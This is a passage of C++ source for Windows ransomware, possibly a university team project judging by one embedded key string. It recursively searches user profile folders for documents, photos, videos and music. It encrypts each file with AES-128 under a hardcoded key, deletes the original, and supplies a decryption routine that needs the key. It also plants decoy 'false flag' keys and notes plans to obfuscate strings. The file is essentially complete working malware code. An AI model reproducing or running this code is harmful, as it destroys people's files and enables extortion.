		hKey = NULL;
	}
}

void PrintProgress()
{
	Sleep(150);
	for (int i = 0; i < 6; i++)
	{
		std::cout << ".";
		Sleep(150);
	}
	std::cout << "." << std::endl;
}

bool ExcludePath(std::string checkString)
{
	// Check for paths to exclude from encryption/decryption process

	if (checkString.find(strAppData) != std::string::npos)
	{
		// Exclude files in the AppData directory
		return true;
	}
	else if (checkString.find(strAllUsers) != std::string::npos)
	{
		// Exclude files in the All Users directory
		return true;
	}
	else if (checkString.find(strPublicAcctPics) != std::string::npos)
	{
		// Exclude files in the Public\AccountPictures directory
		return true;
	}
	else
	{
		// Do not exclude this path
		return false;
	}
}

bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string key)
{
	// Performs file encryption operation

	// Note: the param 'key' is not used anywhere - it is a false flag

	wchar_t keyDefault0[] = L"Q2hyaXNDbGFyaXNzYVNhbWFudGhhU2t5bGFy"; // ChrisClarissaSamanthaSkylar
	wchar_t keyDefault1[] = L"Tm90TXlNb25rZXlzTm90TXlDaXJjdXM="; // false flag key
	wchar_t keyDefault2[] = L"VVcgQ1NTIDU3OSBUZWFtIFByb2plY3Q="; // false flag key
	wchar_t keyDefault3[] = L"Q2xhcmlzc2FTYW1hbnRoYVNreWxhckNocmlz"; // false flag key
	wchar_t keyDefault4[] = L"U2FtYW50aGFTa3lsYXJDaHJpc0NsYXJpc3Nh"; // false flag key
	wchar_t keyDefault5[] = L"U2t5bGFyQ2hyaXNDbGFyaXNzYVNhbWFudGhh"; // false flag key

	wchar_t* keyString = keyDefault0;
	DWORD keyLength = lstrlenW(keyString);

	// Converting filenames to LPCWSTRs for easier processing wiht CryptoAPIs
	LPCWSTR inputFile = std::wstring(fileToEncrypt.begin(), fileToEncrypt.end()).c_str();
	LPCWSTR outputFile = std::wstring(fileEncrypted.begin(), fileEncrypted.end()).c_str();

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::wcout << "Key:         " << keyDefault0 << std::endl;
		std::cout << "Key (addr):  " << keyString << std::endl;
		std::cout << "Key length:  " << keyLength << std::endl;
		std::cout << "Input file:  " << fileToEncrypt.c_str() << std::endl;
		std::cout << "Output file: " << fileEncrypted.c_str() << std::endl;
	}
#endif

	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInputFile == INVALID_HANDLE_VALUE)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "Cannot open input file!" << std::endl;
#endif

		return false;
	}

	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutputFile == INVALID_HANDLE_VALUE)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "Cannot open output file!" << std::endl;
#endif

		return false;
	}

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	//wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";  // TODO: Fix this string for obfuscation
	wchar_t* cryptProvider = new wchar_t[strCryptoProvider.length() + 1];
	std::copy(strCryptoProvider.begin(), strCryptoProvider.end(), cryptProvider);
	cryptProvider[strCryptoProvider.length()] = 0;
	HCRYPTPROV hCryptProvider;

	if (!CryptAcquireContextW(&hCryptProvider, NULL, cryptProvider, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptAcquireContext failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	HCRYPTHASH hCryptHash;
	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptCreateHash failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
	{
		DWORD dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptHashData Success! " << std::endl;

	HCRYPTKEY hCryptKey;
	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptDeriveKey failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptDeriveKey Success! " << std::endl;

	const size_t chunkSize = BLOCK_LEN;
	BYTE dataChunk[chunkSize] = { 0 };
	DWORD outputLength = 0;
	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInputFile, NULL);

	while (bResult = ReadFile(hInputFile, dataChunk, chunkSize, &outputLength, NULL))
	{
		if (0 == outputLength)
		{
			break;
		}

		readTotalSize += outputLength;

		if (readTotalSize == inputSize)
		{
			isFinal = TRUE;
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "Finalizing encrypted data file." << std::endl;
#endif
		}

		// Encrypt data
		if (!CryptEncrypt(hCryptKey, NULL, isFinal, 0, dataChunk, &outputLength, chunkSize))
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "CryptEncrypt failed :(" << std::endl;
#endif

			break;
		}

		DWORD written = 0;
		if (!WriteFile(hOutputFile, dataChunk, outputLength, &written, NULL))
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "WriteFile(output file) failed :(" << std::endl;
#endif

			break;
		}

		memset(dataChunk, 0, chunkSize);
	}

	CryptReleaseContext(hCryptProvider, 0);
	CryptDestroyKey(hCryptKey);
	CryptDestroyHash(hCryptHash);
	CloseHandle(hInputFile);
	CloseHandle(hOutputFile);

	return true;
}

bool Decryptor(std::string fileToDecrypt, std::string fileRestored, std::string key)
{
	// Performs file decryption operation

	// Note: the param 'key' is the actual key used for file decryption !!
	
	LPCWSTR keyString = std::wstring(key.begin(), key.end()).c_str();
	DWORD keyLength = lstrlenW(keyString);

	// Converting filenames to LPCWSTRs for easier processing with CryptoAPIs
	LPCWSTR inputFile = std::wstring(fileToDecrypt.begin(), fileToDecrypt.end()).c_str();
	LPCWSTR outputFile = std::wstring(fileRestored.begin(), fileRestored.end()).c_str();

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::wcout << "Key:         " << key.c_str() << std::endl;
		std::cout << "Key (addr):  " << keyString << std::endl;
		std::cout << "Key length:  " << keyLength << std::endl;
		std::cout << "Input file:  " << fileToDecrypt.c_str() << std::endl;
		std::cout << "Output file: " << fileRestored.c_str() << std::endl;
	}
#endif

	HANDLE hInputFile = CreateFileW(inputFile, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInputFile == INVALID_HANDLE_VALUE)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "Cannot open input file!" << std::endl;
#endif

		return false;
	}

	HANDLE hOutputFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutputFile == INVALID_HANDLE_VALUE)
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "Cannot open output file!" << std::endl;
#endif

		return false;
	}

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	//wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";  // TODO: Fix this string for obfuscation
	wchar_t* cryptProvider = new wchar_t[strCryptoProvider.length() + 1];
	std::copy(strCryptoProvider.begin(), strCryptoProvider.end(), cryptProvider);
	cryptProvider[strCryptoProvider.length()] = 0;
	HCRYPTPROV hCryptProvider;

	if (!CryptAcquireContextW(&hCryptProvider, NULL, cryptProvider, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptAcquireContext failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	HCRYPTHASH hCryptHash;
	if (!CryptCreateHash(hCryptProvider, CALG_SHA_256, 0, 0, &hCryptHash))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptCreateHash failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}

	if (!CryptHashData(hCryptHash, (BYTE*)keyString, keyLength, 0))
	{
		DWORD dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptHashData failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptHashData Success! " << std::endl;

	HCRYPTKEY hCryptKey;
	if (!CryptDeriveKey(hCryptProvider, CALG_AES_128, hCryptHash, 0, &hCryptKey))
	{
		dwStatus = GetLastError();
#ifdef TRACEOUTPUT
		if (g_Verbosity)
			std::cout << "CryptDeriveKey failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif

		CryptReleaseContext(hCryptProvider, 0);

		return false;
	}
	//if (g_Verbosity)
		//std::cout << "CryptDeriveKey Success! " << std::endl;

	const size_t chunkSize = BLOCK_LEN;
	BYTE dataChunk[chunkSize] = { 0 };
	DWORD outputLength = 0;
	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;
	DWORD inputSize = GetFileSize(hInputFile, NULL);
	bool retValue = true;

	while (bResult = ReadFile(hInputFile, dataChunk, chunkSize, &outputLength, NULL))
	{
		if (0 == outputLength)
		{
			break;
		}

		readTotalSize += outputLength;

		if (readTotalSize == inputSize)
		{
			isFinal = TRUE;
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "Finalizing decrypted data file." << std::endl;
#endif
		}

		// Decrypt data
		if (!CryptDecrypt(hCryptKey, NULL, isFinal, 0, dataChunk, &outputLength))
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
			{
				std::cout << "CryptDecrypt  failed :(" << std::endl;
				DWORD dwStatus;
				dwStatus = GetLastError();

				LPVOID lpMsgBuf;
				FormatMessage(
					FORMAT_MESSAGE_ALLOCATE_BUFFER |
					FORMAT_MESSAGE_FROM_SYSTEM |
					FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL,
					dwStatus,
					MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
					(LPTSTR)& lpMsgBuf,
					0, NULL);

				std::cout << "CryptDecrypt status: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
				std::wcout << "CryptDecrypt error:  " << (LPTSTR)lpMsgBuf;
			}
#endif

			retValue = false;
			break;
		}

		DWORD written = 0;
		if (!WriteFile(hOutputFile, dataChunk, outputLength, &written, NULL))
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "WriteFile(output file) failed :(" << std::endl;
#endif

			retValue = false;
			break;
		}

		memset(dataChunk, 0, chunkSize);
	}

	CryptReleaseContext(hCryptProvider, 0);
	CryptDestroyKey(hCryptKey);
	CryptDestroyHash(hCryptHash);
	CloseHandle(hInputFile);
	CloseHandle(hOutputFile);

	return retValue;
}

bool EncryptAndDeleteThisFile(std::string path)
{
#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << "Encrypting " << path << " ..." << std::endl;
#endif

	bool fEncrypted = false;
	bool fDeleted = false;

	std::string pathEncrypted = path;
	pathEncrypted.append(strExtEncrypted);

	fEncrypted = Cryptor(path, pathEncrypted, "NotMyMonkeysNotMyCircus");  // NotMyMonkeysNotMyCircus is a false flag

#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << "Encrypt result: " << fEncrypted << std::endl;
#endif

	if (fEncrypted)
	{
		// Only delete original file if Encryption succeeded 

		fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
		if (!fDeleted)
		{
			DWORD dwStatus;
			dwStatus = GetLastError();
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif
		}
		else
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "Delete result:  " << fDeleted << std::endl;
#endif
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << std::endl;
#endif

	if (fEncrypted)
		return true;
	else
		return false;
}

bool DecryptThisFile(std::string path, std::string decryptionKey)
{
#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << "Decrypting " << path << " ..." << std::endl;
#endif

	bool fDecrypted = false;
	bool fDeleted = false;

	std::string pathRestoreTargetFile = path;
	pathRestoreTargetFile.erase(pathRestoreTargetFile.end() - 10, pathRestoreTargetFile.end());

	fDecrypted = Decryptor(path, pathRestoreTargetFile, decryptionKey);

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::cout << "Decryption result: " << fDecrypted << std::endl;
		std::cout << "Restored file:  " << pathRestoreTargetFile << std::endl;
	}
#endif

	if (fDecrypted)
	{
		// Only delete encrypted file if Decryption succeeded 

		fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
		if (!fDeleted)
		{
			DWORD dwStatus;
			dwStatus = GetLastError();
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "DeleteFile failed: " << dwStatus << " [0x" << std::hex << dwStatus << "]" << std::endl;
#endif
		}
		else
		{
#ifdef TRACEOUTPUT
			if (g_Verbosity)
				std::cout << "Delete result:  " << fDeleted << std::endl;
#endif
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
		std::cout << std::endl;
#endif

	if (fDecrypted)
		return true;
	else
		return false;
}

DWORD FindFiles()
{
	DWORD dwFileCounter = 0;
	DWORD dwEncryptionCounter = 0;

	// File extension filters to target important files
	// Using lowercase extenstions
	// Restricting search path to the Users directory
	std::string path = ""; // c:\\users
	// Get the Users directory from the system
	PWSTR pszUsersFolder = NULL;
	HRESULT hr = S_OK;
	hr = SHGetKnownFolderPath((REFKNOWNFOLDERID)FOLDERID_UserProfiles, 0, NULL, &pszUsersFolder);
	if (!FAILED(hr))
	{
		// Found the Users directory, save it 
		path = WstrToStr(pszUsersFolder);
		CoTaskMemFree(pszUsersFolder);

#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Users directory:  " << path << std::endl;
		}
#endif
	}
	else
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Get Users directory failed:  " << std::hex << hr << std::endl;
		}
#endif

		return GET_USERS_DIR_FAILED;
	}
	
	std::string tempExt;

	for (const auto& entry : fs::recursive_directory_iterator(path))
	{
		// Check for paths to exclude from processing
		if (ExcludePath(entry.path().string()))
		{
			continue; // Excluding path by terminating the current loop iteration
		}

		// Convert extention to lowercase for later comparison
		tempExt = entry.path().extension().string();
		std::transform(tempExt.begin(), tempExt.end(), tempExt.begin(), ::tolower);

		if (tempExt == strExtJpg ||
			tempExt == strExtJpeg ||
			tempExt == strExtPng ||
			tempExt == strExtGif ||
			tempExt == strExtMp4 ||
			tempExt == strExtMpg ||
			tempExt == strExtMpeg ||
			tempExt == strExtMov ||
			tempExt == strExtMkv ||
			tempExt == strExtM2ts ||
			tempExt == strExtMp3 ||
			tempExt == strExtM4a ||
			tempExt == strExtBmp ||
			tempExt == strExtDoc ||
			tempExt == strExtDocx ||
			tempExt == strExtXls ||
			tempExt == strExtXlsx ||
			tempExt == strExtPpt ||
			tempExt == strExtPptx ||
			tempExt == strExtPdf ||
			tempExt == strExtTxt
			)
		{
			//std::cout << entry.path() << std::endl;
			dwFileCounter++;

			// Encrypt file
			if (EncryptAndDeleteThisFile(entry.path().string()))
			{
				dwEncryptionCounter++;
			}
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::cout << "Total files found:     " << dwFileCounter << std::endl;
		std::cout << "Total files encrypted: " << dwEncryptionCounter << std::endl;
	}
#endif

	return dwEncryptionCounter; // dwFileCounter;
}

DWORD FindEncryptedFiles(std::string decryptionKey)
{
	DWORD dwFileCounter = 0;
	DWORD dwDecryptionCounter = 0;

	// File extension filter to target encrypted files
	// Using lowercase extenstions
	// Restricting search path to the Users directory
	std::string path = ""; // c:\\users
	// Get the Users directory from the system
	PWSTR pszUsersFolder = NULL;
	HRESULT hr = S_OK;
	hr = SHGetKnownFolderPath((REFKNOWNFOLDERID)FOLDERID_UserProfiles, 0, NULL, &pszUsersFolder);
	if (!FAILED(hr))
	{
		path = WstrToStr(pszUsersFolder);
		CoTaskMemFree(pszUsersFolder);

#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Users directory:  " << path << std::endl;
		}
#endif
	}
	else
	{
#ifdef TRACEOUTPUT
		if (g_Verbosity)
		{
			std::cout << "Get Users directory failed:  " << std::hex << hr << std::endl;
		}
#endif

		return -25;
	}

	for (const auto& entry : fs::recursive_directory_iterator(path))
	{
		// Check for paths to exclude from processing
		if (ExcludePath(entry.path().string()))
		{
			continue; // Excluding path by terminating the current loop iteration 
		}

		if (entry.path().extension() == strExtEncrypted)
		{
			//std::cout << entry.path() << std::endl;
			dwFileCounter++;

			// Decrypt file
			if (DecryptThisFile(entry.path().string(), decryptionKey))
			{
				dwDecryptionCounter++;
			}
			else
			{
				std::cout << " : " << entry.path().string() << std::endl; // Output the file path/name that failed to decrypt
			}
		}
	}

#ifdef TRACEOUTPUT
	if (g_Verbosity)
	{
		std::cout << "Total files found:     " << std::dec << dwFileCounter << " [0x" << std::hex << dwFileCounter << "]" << std::endl;
		std::cout << "Total files decrypted: " << std::dec << dwDecryptionCounter << " [0x" << std::hex << dwFileCounter << "]" << std::endl;
	}
#endif

	return dwFileCounter - dwDecryptionCounter;  // if > 0, then files failed to decrypt
}

std::string WstrToStr(const std::wstring& wstr)
{
	// Convert a PWSTR to a std::string

	std::string strNewStdString;
	char* szTmp = new char[wstr.length() + 1];
	szTmp[wstr.size()] = '\0';
	WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, szTmp, (int)wstr.length(), NULL, NULL);
	strNewStdString = szTmp;
	delete[] szTmp;
	return strNewStdString;
}

std::wstring StrToLpcwstr(std::string str)
{
	int len;
	int slength = (int)str.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, str.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, str.c_str(), slength, buf, len);
	std::wstring wStr(buf);
	return wStr;
}

void HexToString(const std::string hexstr, std::string & str)
{
	// Convert string of Hex numbers to its a std::string

	std::string hextmp(hexstr);
	std::reverse(hextmp.begin(), hextmp.end());

	str.resize((hextmp.size() + 1) / 2);

	for (size_t i = 0, j = 0; i < str.size(); i++, j++)
	{
		str[i] = (hextmp[j] & '@' ? hextmp[j] + 9 : hextmp[j]) << 4, j++;
		str[i] |= (hextmp[j] & '@' ? hextmp[j] + 9 : hextmp[j]) & 0xF;
	}
}

std::string GetLocalComputerName()
{
	WCHAR buffer[512] = L"";
	DWORD dwSize = sizeof(buffer);

	GetComputerNameEx(ComputerNameDnsFullyQualified, buffer, &dwSize);
	//GetComputerName(buffer, &dwSize);

	char chxfer[512];
	char defaultChar = ' ';
	WideCharToMultiByte(CP_ACP, 0, buffer, -1, chxfer, 260, &defaultChar, NULL);

	std::string computerName(chxfer);

	return computerName;
}

std::string GetCurrentUser()
{
	WCHAR buffer[512] = L"";
	DWORD dwSize = sizeof(buffer);

	GetUserName(buffer, &dwSize);

	char chxfer[512];
	char defaultChar = ' ';
	WideCharToMultiByte(CP_ACP, 0, buffer, -1, chxfer, 260, &defaultChar, NULL);

	std::string userName(chxfer);

	return userName;
}

std::string GetUtcTime()
{
	time_t systemTime;
	struct tm timeinfo;
	char timeBuffer[80];

	time(&systemTime);
	gmtime_s(&timeinfo , &systemTime);

	std::strftime(timeBuffer, sizeof(timeBuffer), "%Y-%m-%d %H:%M:%S", &timeinfo);
	std::string utcTime(timeBuffer);
	utcTime.append(" UTC");
	
	return utcTime;
}
